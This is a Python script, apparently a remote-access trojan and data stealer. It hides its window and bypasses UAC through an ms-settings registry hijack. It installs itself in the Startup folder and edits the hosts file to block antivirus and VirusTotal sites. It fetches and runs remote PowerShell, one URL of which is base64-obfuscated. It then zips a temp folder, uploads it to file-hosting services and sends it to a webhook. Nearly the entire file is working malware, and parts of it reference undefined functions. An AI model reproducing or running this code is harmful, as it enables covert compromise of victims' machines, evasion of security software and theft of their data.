_E='content'
_D='Power_rat_data.zip'
_C='file'
_B=False
_A=True
import subprocess,ctypes,sys,base64,os,shutil,ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
def UACbypass(method=1):
	G='reg delete hkcu\\Software\\Classes\\ms-settings /f';F='reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f';C='wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text';B=method
	if GetSelf()[1]:
		A=lambda cmd:subprocess.run(cmd,shell=_A,capture_output=_A)
		if B==1:
			A(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{GetSelf()}" /f');A(F);D=len(A(C).stdout);A('computerdefaults --nouacbypass');E=len(A(C).stdout);A(G)
			if E>D:return UACbypass(B+1)
		elif B==2:
			A(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{GetSelf()}" /f');A(F);D=len(A(C).stdout);A('fodhelper --nouacbypass');E=len(A(C).stdout);A(G)
			if E>D:return UACbypass(B+1)
		else:return _B
		return _A
def IsAdmin():return ctypes.windll.shell32.IsUserAnAdmin()==1
def GetSelf():return sys.argv[0]
if not IsAdmin():
	if UACbypass():os._exit(0)
def add_to_startup():
	C=os.path.join(os.getenv('ProgramData'),'Microsoft','Windows','Start Menu','Programs','Startup');B=GetSelf();A=os.path.join(C,os.path.basename(B))
	if os.path.exists(A):print('Executable is already in Startup.');return
	try:shutil.copy2(B,A);print(f"Copied to Startup: {A}")
	except Exception as D:print(f"Failed to copy to Startup: {D}")
add_to_startup()
import subprocess,os,zipfile,random,string,requests,io,os,subprocess
def block_sites():
	E=subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',shell=_A,capture_output=_A)
	if E.returncode!=0:F=os.path.join('System32','drivers','etc')
	else:F=os.sep.join(E.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
	B=os.path.join(os.getenv('systemroot'),F,'hosts')
	if not os.path.isfile(B):return
	with open(B)as D:H=D.readlines()
	G='virustotal.com','avast.com','totalav.com','scanguard.com','totaladblock.com','pcprotect.com','mcafee.com','bitdefender.com','us.norton.com','avg.com','malwarebytes.com','pandasecurity.com','avira.com','norton.com','eset.com','zillya.com','kaspersky.com','usa.kaspersky.com','sophos.com','home.sophos.com','adaware.com','bullguard.com','clamav.net','drweb.com','emsisoft.com','f-secure.com','zonealarm.com','trendmicro.com','ccleaner.com';A=[]
	for C in H:
		if any([A in C for A in G]):continue
		else:A.append(C)
	for C in G:A.append('\t0.0.0.0 {}'.format(C));A.append('\t0.0.0.0 www.{}'.format(C))
	A='\n'.join(A).replace('\n\n','\n');subprocess.run('attrib -r {}'.format(B),shell=_A,capture_output=_A)
	with open(B,'w')as D:D.write(A)
	subprocess.run('attrib +r {}'.format(B),shell=_A,capture_output=_A)
block_sites()
def error_handler(e):print(f"Error: {str(e)}")
def run_powershell_script(url):A=f"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {{iwr -Uri '{url}' -UseBasicParsing | iex}}\"";subprocess.run(A,shell=_A,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
def zip_folder(folder_path,password,zip_name):
	B=folder_path;A=io.BytesIO()
	with zipfile.ZipFile(A,'w',zipfile.ZIP_DEFLATED)as D:
		for(E,I,F)in os.walk(B):
			for G in F:C=os.path.join(E,G);H=os.path.relpath(C,B);D.write(C,H)
	return A.getvalue(),len(A.getvalue())
def gofileupload(path):
	G='utf-8';F='downloadPage';E='server';D='https://api.gofile.io/getServer';B='data'
	try:H=requests.post(f"https://{requests.get(D).json()[B][E]}.gofile.io/uploadFile",files={_C:open(path,'rb')}).json()[B][F];return H
	except Exception as A:
		error_Handler(A)
		try:
			try:C=loads(urlopen(D).read().decode(G))[B][E]
			except Exception as A:error_Handler(A);C='store4'
			I=subprocess.Popen(f'curl -F "file=@{path}" https://{C}.gofile.io/uploadFile',shell=_A,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate();return loads(I[0].decode(G))[B][F]
		except Exception as A:error_Handler(A);return _B
def catboxmoeupload(path,request_type='upload'):
	try:
		with open(path,'rb')as A:B={'reqtype':'fileupload','userhash':''};C={'fileToUpload':(A.name,A,'application/octet-stream')};D=requests.post(f"https://catbox.moe/user/api.php?request_type={request_type}",files=C,data=B);return D.content.decode()
	except Exception as E:return _B
def fileioupload(path):
	try:
		with open(path,'rb')as A:B=requests.post('https://file.io/',files={_C:A})
		return B.json()['link']
	except Exception as C:return _B
def upload_file(path):
	B=path;A=gofileupload(B)
	if not A:A=catboxmoeupload(B)
	if not A:A=fileioupload(B)
	return A
ps_script_url='https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1'
run_powershell_script(ps_script_url)
subprocess.Popen(['powershell','-Command',requests.get(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode()).text],creationflags=subprocess.CREATE_NO_WINDOW)
password=''.join(random.choices(string.ascii_letters+string.digits,k=12))
temp_folder=os.path.join(os.getenv('TEMP'),'loader')
zip_data,zip_size=zip_folder(temp_folder,password,_D)
if zip_size>20*1024*1024:
	zip_path=os.path.join(temp_folder,_D)
	with open(zip_path,'wb')as f:f.write(zip_data)
	link=upload_file(zip_path)
else:link=None
content=f"hai1723 on top\npassword:{password}"
filename=_D
webhook_url='YOUR_WEBHOOK_URL'
if link:content+=f"\nDownload link: {link}";response=requests.post(webhook_url,data={_E:content})
else:files={_C:(filename,zip_data)};data={_E:content};response=requests.post(webhook_url,files=files,data=data)
if response.status_code==200:print('File sent successfully.')
else:print(f"Failed to send file. Status code: {response.status_code}")